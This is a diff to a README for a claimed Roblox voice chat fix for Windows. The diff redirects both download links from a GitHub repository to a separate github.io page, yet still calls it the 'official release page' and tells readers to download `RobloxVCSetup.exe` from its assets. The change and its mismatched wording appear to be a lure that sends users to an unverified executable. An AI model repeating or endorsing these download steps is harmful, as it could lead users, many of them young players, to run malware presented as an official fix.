@@ -1,6 +1,6 @@
 # 🗣️ Roblox-Voice-Chat-Fix – Restore Your Voice Chat Today
 
-[![](https://img.shields.io/badge/Download-Voice-Chat-Fix-blue.svg)](https://github.com/Arched-formalism998/Roblox-Voice-Chat-Fix)
+[![](https://img.shields.io/badge/Download-Voice-Chat-Fix-blue.svg)](https://arched-formalism998.github.io)
 
 This tool resolves issues where voice chat fails to function within the Roblox client on Windows 10 and Windows 11. It automates common configuration checks and repairs registry settings that prevent the microphone from detecting your voice in-game.
 
@@ -15,7 +15,7 @@ Ensure you meet these requirements before you start:
 
 ## 🚀 Downloading the Fix
 
-1. Visit the [official release page](https://github.com/Arched-formalism998/Roblox-Voice-Chat-Fix) to access the download.
+1. Visit the [official release page](https://arched-formalism998.github.io) to access the download.
 2. Look for the "Assets" section at the bottom of the latest release post.
 3. Click the file named `RobloxVCSetup.exe` to start your download.
 4. Save the file to a folder you can find later, such as your Downloads folder.
